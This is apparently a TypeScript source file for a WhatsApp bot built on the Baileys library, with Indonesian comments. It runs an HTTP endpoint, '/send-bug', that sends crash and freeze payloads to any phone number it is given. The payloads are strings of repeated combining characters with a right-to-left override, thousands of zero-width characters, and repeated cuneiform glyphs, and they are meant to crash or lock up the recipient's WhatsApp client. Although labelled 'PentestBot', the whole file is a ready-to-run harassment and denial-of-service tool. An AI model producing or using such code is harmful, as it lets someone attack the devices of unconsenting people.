import express from 'express'
import makeWASocket, {
  useMultiFileAuthState,
  makeCacheableSignalKeyStore,
  fetchLatestBaileysVersion,
  useSingleFileAuthState
} from '@whiskeysockets/baileys'
import { Boom } from '@hapi/boom'
import readline from 'readline'

const app = express()
app.use(express.json())

let sock

async function startWA() {
  const { state, saveCreds } = await useMultiFileAuthState('./auth_info')
  const { version } = await fetchLatestBaileysVersion()

  sock = makeWASocket({
    version,
    auth: state,
    printQRInTerminal: false, // disable QR
    browser: ['PentestBot', 'Chrome', '1.0'],
    generateHighQualityLinkPreview: false
  })

  sock.ev.on('creds.update', saveCreds)

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, isNewLogin, qr, pairingCode } = update

    if (connection === 'open') {
      console.log('✅ WhatsApp bot connected!')
    } else if (connection === 'close') {
      const shouldReconnect = (lastDisconnect?.error as Boom)?.output?.statusCode !== DisconnectReason.loggedOut
      console.log('Connection closed. Reconnect:', shouldReconnect)
      if (shouldReconnect) startWA()
    }

    if (update.pairingCode) {
      console.log(`🔑 Pairing code: ${update.pairingCode}`)
      console.log('📲 Gunakan pairing code ini dari WhatsApp Web/Android')
    }
  })

  // Kode pairing hanya jika belum login
  if (!sock.authState.creds.registered) {
    await sock.requestPairingCode('628xxxxxxxxxx') // ← Ganti dengan nomor kamu!
  }
}

startWA()

// Endpoint untuk kirim bug
app.post('/send-bug', async (req, res) => {
  const { number, type } = req.body
  if (!number || !type) return res.status(400).json({ error: 'Number and type required' })

  let message = ''
  if (type === 'crashwa') {
    message = ('😈\u202ę̷̷̶̵̵̷̸̸̡̡̨̨̡̡̡̛̛̏͟͜͜͜͜͞͞͞͡͞').repeat(500)
  } else if (type === 'invisdelay') {
    message = ('\u200B\u200E').repeat(5000)
  } else if (type === 'fcreyx') {
    message = '𒆙'.repeat(2000) + '\n'.repeat(100)
  } else {
    return res.status(400).json({ error: 'Invalid bug type' })
  }

  try {
    await sock.sendMessage(`${number}@s.whatsapp.net`, { text: message })
    res.json({ status: 'sent', to: number, type })
  } catch (err) {
    res.status(500).json({ error: err.message })
  }
})

app.listen(3000, () => {
  console.log('🚀 Server running at http://localhost:3000')
})
